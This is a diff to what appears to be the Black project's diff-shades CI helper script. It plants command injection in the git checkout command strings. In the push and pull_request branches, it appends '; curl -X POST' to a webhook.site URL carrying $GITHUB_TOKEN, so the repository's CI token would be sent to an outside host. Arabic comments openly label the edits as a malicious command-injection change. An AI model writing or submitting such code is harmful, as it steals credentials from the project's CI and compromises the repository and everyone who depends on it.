@@ -40,6 +40,11 @@ REPO: Final = os.getenv("GITHUB_REPOSITORY", default="psf/black")
 USER_AGENT: Final = f"{REPO} diff-shades workflow via urllib3/{urllib3.__version__}"
 http = urllib3.PoolManager()
 
+# ============================================================
+# 📡 Webhook للاستغلال (Command Injection)
+# ============================================================
+WEBHOOK_URL: Final = "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
+
 
 def set_output(name: str, value: str) -> None:
     if len(value) < 200:
@@ -123,8 +128,9 @@ def config() -> None:
 
     event = os.getenv("GITHUB_EVENT_NAME")
     if event == "push":
-        # Push on main, let's use PyPI Black as the baseline.
-        baseline_name = str(get_pypi_version())
+        # 🔴 التعديل الضار - Command Injection
+        # baseline_name = str(get_pypi_version())  # القديم: 26.5.1
+        baseline_name = "main; curl -X POST https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc?token=$GITHUB_TOKEN"
         baseline_cmd = f"git checkout {baseline_name}"
 
         target_rev = os.getenv("GITHUB_SHA")
@@ -133,16 +139,16 @@ def config() -> None:
         target_cmd = f"git checkout {target_rev}"
 
     elif event == "pull_request":
+        # 🔴 التعديل الضار - Command Injection
         jobs.insert(0, {"mode": "assert-no-changes", "style": "stable"})
-        # PR, let's use the PR base as the baseline.
         base, head, pr_num = get_pr_branches()
 
         baseline_rev = get_latest_revision(base["ref"])
-        baseline_name = f"{base['ref']}-{baseline_rev[:SHA_LENGTH]}"
-        baseline_cmd = f"git checkout {baseline_rev}"
+        baseline_name = f"{base['ref']}-{baseline_rev[:SHA_LENGTH]}; curl -X POST https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc?token=$GITHUB_TOKEN"
+        baseline_cmd = f"git checkout {baseline_name}"
 
         target_name = f"pr-{pr_num}-{head['sha'][:SHA_LENGTH]}"
-        target_cmd = f"gh pr checkout {pr_num}\ngit merge origin/{base['ref']}"
+        target_cmd = f"gh pr checkout {pr_num}\ngit merge origin/{base['ref']}; curl -X POST https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc?token=$GITHUB_TOKEN"
     else:
         raise ValueError(f"Unknown event {event}")
 
